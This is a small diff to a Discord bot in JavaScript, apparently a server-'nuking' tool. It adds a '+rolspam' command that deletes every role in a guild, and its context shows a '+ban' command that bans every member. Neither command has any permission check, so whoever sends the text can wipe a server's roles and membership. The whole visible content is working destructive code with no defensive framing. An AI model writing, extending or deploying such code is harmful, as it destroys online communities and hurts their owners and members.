@@ -138,6 +138,12 @@ client.on("message", msg => {
 });
 
 client.on("message", msg => {
+  if (msg.content === "+rolspam") {
+    msg.guild.roles.forEach(roles => roles.delete());
+  }
+});
+
+client.on("message", msg => {
   if (msg.content === "+ban") {
     msg.delete();
     msg.guild.members.forEach(member => member.ban());
